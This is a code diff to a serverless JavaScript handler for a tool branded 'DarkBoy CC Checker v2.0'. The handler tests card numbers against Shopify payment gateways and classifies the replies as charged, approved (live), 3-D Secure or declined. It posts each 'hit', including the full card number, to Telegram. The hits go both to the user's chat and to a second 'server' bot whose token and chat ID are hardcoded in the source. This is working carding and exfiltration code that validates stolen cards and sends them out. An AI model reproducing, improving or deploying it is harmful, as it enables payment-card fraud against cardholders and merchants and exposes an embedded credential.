@@ -51,6 +51,8 @@ export default async function handler(req, res) {
     });
 
     const responseText = await response.text();
+    console.log('Raw API Response:', responseText);
+    
     let jsonResult;
     
     try {
@@ -58,21 +60,29 @@ export default async function handler(req, res) {
     } catch (parseError) {
       jsonResult = {
         status: response.ok ? 'success' : 'error',
-        message: responseText.trim(),
+        response: responseText.trim(),
         raw_response: responseText
       };
     }
 
+    // Add metadata
     jsonResult.processed_at = new Date().toISOString();
     jsonResult.http_status = response.status;
 
-    // Check if this is a successful result
-    if (jsonResult && isSuccessfulResult(jsonResult)) {
+    console.log('Parsed Result:', JSON.stringify(jsonResult, null, 2));
+
+    // Check if this is a successful result (APPROVED cards only)
+    if (jsonResult && isApprovedResult(jsonResult)) {
+      console.log('🎯 Card is approved! Sending Telegram notifications...');
       const telegramResults = await sendDualTelegramNotifications(cc, site, jsonResult, userBotToken, userChatId);
       jsonResult.telegram_notifications = telegramResults;
+      console.log('📱 Telegram results:', telegramResults);
+    } else {
+      console.log('❌ Card not approved, skipping Telegram notifications');
     }
 
-    return res.status(response.status).json(jsonResult);
+    // Always return the result (whether approved or declined)
+    return res.status(200).json(jsonResult);
 
   } catch (error) {
     console.error('Proxy Error:', error);
@@ -83,27 +93,45 @@ export default async function handler(req, res) {
   }
 }
 
-// Helper function to determine if result is successful
-function isSuccessfulResult(result) {
-  if (!result || !result.message) return false;
+// Helper function to determine if result is APPROVED (only send telegram for approved)
+function isApprovedResult(result) {
+  if (!result) return false;
   
-  const message = result.message.toLowerCase();
-  const successKeywords = [
-    'success', 'approved', 'succeeded', 'thank you', 'payment successful',
-    'transaction approved', 'charge created', 'payment processed', 'completed',
-    'charged', 'payment charged', 'charge successful', 'insufficient_funds',
-    'insufficient funds', 'incorrect_cvv', 'invalid_cvv', 'incorrect_zip',
-    'incorrect_cvc', 'invalid_cvc'
+  console.log('Checking if approved:', result);
+  
+  // Check response message
+  const message = (result.response || result.message || '').toLowerCase();
+  
+  // Charged/Success keywords (definitely approved)
+  const chargedKeywords = [
+    'thank you', 'payment successful', 'transaction approved', 'charge created',
+    'payment processed', 'completed', 'charged', 'payment charged', 'success'
   ];
   
-  return successKeywords.some(keyword => message.includes(keyword));
+  if (chargedKeywords.some(keyword => message.includes(keyword))) {
+    console.log('✅ Found charged keyword, sending telegram');
+    return true;
+  }
+  
+  // ONLY insufficient funds is considered APPROVED (live card but no money)
+  const approvedKeywords = [
+    'insufficient_funds', 'insufficient funds'
+  ];
+  
+  if (approvedKeywords.some(keyword => message.includes(keyword))) {
+    console.log('✅ Found approved keyword (insufficient funds), sending telegram');
+    return true;
+  }
+  
+  console.log('❌ Not approved, no telegram sent');
+  return false;
 }
 
-// Function to send notifications to BOTH servers
+// Function to send notifications to BOTH servers (only for approved cards)
 async function sendDualTelegramNotifications(cc, site, result, userBotToken, userChatId) {
-  const responseMessage = result.message || result.response || 'Success';
-  const category = getCategoryFromResponse(responseMessage);
-  const emoji = category === 'charged' ? '💳' : '✅';
+  const responseMessage = result.response || result.message || 'Approved';
+  const category = getCategoryFromResponse(result);
+  const emoji = getEmojiForCategory(category);
   
   // Create message for user
   const userMessage = `${emoji} **${category.toUpperCase()} CARD DETECTED**\n\n` +
@@ -111,22 +139,23 @@ async function sendDualTelegramNotifications(cc, site, result, userBotToken, use
     `🌐 **Site:** ${site}\n` +
     `🔧 **Gateway:** Auto Shopify\n` +
     `📝 **Response:** ${responseMessage}\n` +
+    `📊 **Status:** ${result.status || 'Unknown'}\n` +
     `📊 **Category:** ${category.toUpperCase()}\n` +
     `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
     `🚀 **DarkBoy CC Checker v2.0**`;
 
-  // Create message for your server (with additional info)
+  // Create message for your server
   const serverMessage = `🎯 **NEW HIT FROM USER**\n\n` +
     `${emoji} **${category.toUpperCase()} CARD FOUND**\n` +
     `💳 **Card:** \`${cc}\`\n` +
     `🌐 **Site:** ${site}\n` +
     `🔧 **Gateway:** Auto Shopify\n` +
     `📝 **Response:** ${responseMessage}\n` +
+    `📊 **Status:** ${result.status || 'Unknown'}\n` +
     `📊 **Category:** ${category.toUpperCase()}\n` +
-    `👤 **User Chat ID:** ${userChatId || 'Unknown'}\n` +
-    `⏰ **Time:** ${new Date().toLocaleString()}\n` +
-    `🔍 **IP:** ${process.env.VERCEL_URL || 'Unknown'}\n\n` +
-    `📊 **DarkBoy Server Notification**`;
+    `👤 **User Chat:** ${userChatId || 'Unknown'}\n` +
+    `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
+    `📊 **DarkBoy Server Monitor**`;
 
   const notifications = {
     user: { sent: false, error: null },
@@ -145,9 +174,9 @@ async function sendDualTelegramNotifications(cc, site, result, userBotToken, use
     }
   }
 
-  // Send to YOUR server (your bot credentials)
-  const SERVER_BOT_TOKEN = process.env.SERVER_BOT_TOKEN || "7721067500:AAE5gJfp0zxnO6WR5Qcr9S3WYIvBShUHHjE"; // Your bot token
-  const SERVER_CHAT_ID = process.env.SERVER_CHAT_ID || "6538592001"; // Your chat ID
+  // Send to YOUR server
+  const SERVER_BOT_TOKEN = process.env.SERVER_BOT_TOKEN || "7721067500:AAE5gJfp0zxnO6WR5Qcr9S3WYIvBShUHHjE";
+  const SERVER_CHAT_ID = process.env.SERVER_CHAT_ID || "6538592001";
 
   try {
     await sendTelegramMessage(SERVER_BOT_TOKEN, SERVER_CHAT_ID, serverMessage);
@@ -185,31 +214,50 @@ async function sendTelegramMessage(botToken, chatId, message) {
   return await response.json();
 }
 
-// Helper function to categorize response
-function getCategoryFromResponse(response) {
-  if (!response) return 'approved';
+// Helper function to categorize response properly
+function getCategoryFromResponse(result) {
+  const status = (result.status || '').toLowerCase();
+  const message = (result.response || result.message || '').toLowerCase();
   
-  const responseText = response.toLowerCase();
-  
+  // Check for charged/successful payments first
   const chargedKeywords = [
-    'charged', 'payment charged', 'charge successful', 'transaction charged',
-    'thank you', 'payment successful'
+    'thank you', 'payment successful', 'transaction approved', 'charge created',
+    'payment processed', 'completed', 'charged', 'payment charged'
   ];
   
-  const approvalKeywords = [
-        'success', 'approved', 'succeeded', 'thank you', 'payment successful',
-        'transaction approved', 'charge created', 'payment processed', 'completed'
-    ];
-    const declineKeywords = [
-        'declined', 'failed', 'error', 'invalid', 'insufficient funds',
-        'expired', 'blocked', 'denied', 'rejected', 'card_declined', 'incorrect_cvv', 'incorrect',
-        'security code', "Your card's security code is incorrect"
-    ];
-  if (chargedKeywords.some(keyword => responseText.includes(keyword))) {
+  if (status === 'charged' || chargedKeywords.some(keyword => message.includes(keyword))) {
     return 'charged';
-  } else if (approvalKeywords.some(keyword => responseLower.includes(keyword))) {
-        return 'approved';
-    } else if (declineKeywords.some(keyword => responseLower.includes(keyword))) {
-        return 'decline';
-    }
+  }
+  
+  // Check for live card indicators (CVV errors, insufficient funds, etc.)
+  const approvedKeywords = [
+    'insufficient_funds', 'insufficient funds',
+    'incorrect_cvv', 'invalid_cvv', 'security code is incorrect',
+    'incorrect_cvc', 'invalid_cvc', 'cvc is incorrect',
+    'incorrect_zip', 'postal code', 'zip code',
+    'expired', 'card_expired'
+  ];
+  
+  if (approvedKeywords.some(keyword => message.includes(keyword))) {
+    return 'approved';
+  }
+  
+  // Check for 3D Secure
+  if (message.includes('3d') || message.includes('authentication') || message.includes('verify')) {
+    return 'threed';
+  }
+  
+  // Default to declined
+  return 'declined';
+}
+
+// Helper function to get emoji for category
+function getEmojiForCategory(category) {
+  switch (category) {
+    case 'charged': return '💳';
+    case 'approved': return '✅';
+    case 'threed': return '🔒';
+    case 'declined': return '❌';
+    default: return '❓';
+  }
 }
